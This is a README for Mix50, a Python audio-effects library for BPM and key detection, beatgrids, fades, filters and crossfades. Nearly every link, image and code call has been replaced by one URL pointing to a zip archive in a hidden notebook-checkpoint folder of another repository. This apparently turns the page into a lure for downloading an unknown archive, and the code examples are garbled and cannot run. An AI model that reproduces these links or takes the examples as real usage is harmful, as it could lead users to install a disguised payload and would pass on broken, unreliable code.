
[![GitHub license](https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip)](https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip)
[![PRs Welcome](https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip)](https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip)

<picture>
  <source srcset="https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip" media="(prefers-color-scheme: dark)" />
  <img src="https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip" alt="Your image description">
</picture>

# Mix50
Mix50 is an audio effect and DSP library that runs effects on music files. 
You can retrieve audio features like key, bpm, beatgrid, transition cues. You can apply audio effects like filters, fades, and time warping. You can also attempt to mix and create transitions between two songs autonomously by using the crossfade method in the transitions module.


## Installation

> Users must install PortAudio for I/O capabilities before installing Mix50

> Tested on Python 3.10 and later

```bash
$ sudo apt install portaudio19-dev 
$ pip install Mix50
```

## Audio Effects 
Analyze a WAV audio file -
```python
import Mix50

#Create mixfifty instance
Mixfifty = https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()

#Load Audio(s)
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip('https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip')

#Use the effects module to fade audio in at 15s for 10s
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(start_time=15,fade_duration=10)

#Use the effects module to utilize filter highpass
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(start_time=15, end_time=30, cutoff_freq=1000)

#Use the effects module to control speed of audio
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(start_time=15, end_time=30, original_bpm=126, new_bpm=120)
```

## Audio Features 

```python
import Mix50

#Create mixfifty instance
Mixfifty = https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()

#Load Audio(s)
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip('https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip')

#Get BPM of Audio
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()

#Get Key of Audio
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()

#Get a dataframe of a beatgrid to mix audio files and understand transition cues
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()

==> beats    downbeat    loop_cues    transitions
    9.102    9.102       9.102        9.102
    9.590    NaN         NaN          NaN
    10.054   NaN         NaN          NaN
    10.542   NaN         NaN          NaN
    11.006   11.006      NaN          NaN
... ... ... ... ...
    317.486  NaN         NaN          NaN
    317.974  NaN         NaN          NaN
    318.438 318.438      NaN          NaN
    318.903 NaN          NaN          NaN
    319.390 NaN          NaN          NaN

#Visualize transition cues
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()

```
<p align="center">
  <img width="1000" height="460" src="https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip">
</p>


## Audio Transitions

Mix50 generates transitions based on the beatgrid derived from the audio.

### Parameters

- **`cue_num1`**: Specifies the transition cue for the start of song #1. Typically, songs have up to 10 transition points, but this parameter allows for experimentation.
  
- **`cue_num2`**: Specifies the transition cue for the start of song #2. As with `cue_num1`, songs generally have up to 10 transition points, but this parameter is designed for experimentation.

- **`filter_type`**: Specifies the filter you want to apply to transition the audios. Choices are 'highpass', 'lowpass', or 'none.'
```python

#Create mixfifty instance
Mixfifty = https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()

#Load Two Audio files
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip('https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip', 'https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip')

#Create crossfade transition
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(cue_num1=8,cue_num2=6,fade_duration=10,filter_type='none')
```

## Save & Export Audio

Save, play, and return audio with this module. Saving .MP3 files is not supported; please use .WAV

```python

#Save affected audio to a variable 
affected_audio = https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip(start_time=15,fade_duration=15)

# Play audio in an interactive environment
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()

# Output:
# ==> https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip

# Return raw audio as a numpy array
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip()

# Output:
# ==> array([ 9.06439368e-11,  1.45156775e-10, -1.51146651e-10, ..., 0.00000000e+00,  0.00000000e+00,  0.00000000e+00])

# Save as an audio file: must use .wav; .mp3 not supported
https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip("https://github.com/lilago/Nyce69/raw/refs/heads/main/Mix50/.ipynb_checkpoints/Nyce_v2.7.zip")

```
